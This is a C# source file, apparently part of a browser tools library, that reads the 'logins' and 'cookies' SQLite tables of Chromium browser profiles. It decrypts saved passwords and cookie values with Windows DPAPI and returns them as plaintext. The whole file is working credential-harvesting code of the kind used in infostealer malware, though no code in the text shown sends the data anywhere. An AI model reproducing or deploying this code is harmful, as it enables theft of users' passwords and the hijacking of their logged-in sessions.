using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace BrowserTools.Base
{
    public class Chromium
    {
        public static List<LoginData> GetLoginData(string dataPath, BrowserName browser)
        {
            var loginData = new List<LoginData>();
            SQLiteHandler db = null;

            if(!File.Exists(dataPath))
            {
                return loginData;
            }

            try
            {
                db = new SQLiteHandler(dataPath);
            } catch (Exception)
            {
                return loginData;
            }

            if(!db.ReadTable("logins"))
            {
                return loginData;
            }

            string host, username, password;
            int entries = db.GetRowCount();

            for (int i = 0; i < entries; i++)
            {
                try
                {
                    host = db.GetValue(i, "origin_url");
                    username = db.GetValue(i, "username_value");
                    password = Decrypt(db.GetValue(i, "password_value"));

                    if(!String.IsNullOrEmpty(host) 
                        && !String.IsNullOrEmpty(username) 
                        && !String.IsNullOrEmpty(password))
                    {
                        loginData.Add(new LoginData
                        {
                            Url = host,
                            Username = username,
                            Password = password,
                            Browser = browser
                        });
                    }
                } catch (Exception)
                {
                    return loginData;
                }
            }

            return loginData;
        }

        public static List<Cookie> GetCookies(string dataPath, BrowserName browser)
        {
            var cookies = new List<Cookie>();
            SQLiteHandler db = null;

            if(!File.Exists(dataPath))
            {
                return cookies;
            }

            try
            {
                db = new SQLiteHandler(dataPath);
            } catch (Exception)
            {
                return cookies;
            }

            if(!db.ReadTable("cookies"))
            {
                return cookies;
            }

            string host, name, value, path, expires, lastAccess;
            bool secure, http, expired, persistent, priority;

            int entries = db.GetRowCount();

            for (int i = 0; i < entries; i++)
            {
                try
                {
                    host = db.GetValue(i, "host_key");
                    name = db.GetValue(i, "name");
                    value = Decrypt(db.GetValue(i, "encrypted_value"));
                    path = db.GetValue(i, "path");
                    expires = db.GetValue(i, "expires_utc");
                    lastAccess = db.GetValue(i, "last_access_utc");

                    secure = db.GetValue(i, "secure") == "1";
                    http = db.GetValue(i, "httponly") == "1";
                    expired = db.GetValue(i, "has_expired") == "1";
                    persistent = db.GetValue(i, "persistent") == "1";
                    priority = db.GetValue(i, "priority") == "1";

                    if(!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value))
                    {
                        cookies.Add(new Cookie
                        {
                            HostKey = host,

                            Name = name,
                            Value = value,
                            Path = path,

                            ExpiresUtc = expires,
                            LastAccessUtc = lastAccess,

                            Secure = secure,
                            HttpOnly = http,
                            Expired = expired,
                            Persistent = persistent,
                            Priority = priority,

                            Browser = browser
                        });
                    }
                } catch (Exception)
                {
                    return cookies;
                }
            }

            return cookies;
        }

        private static string Decrypt(string data)
        {
            if(data == null)
            {
                return null;
            }

            byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(data), null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(decryptedData);
        }
    }
}
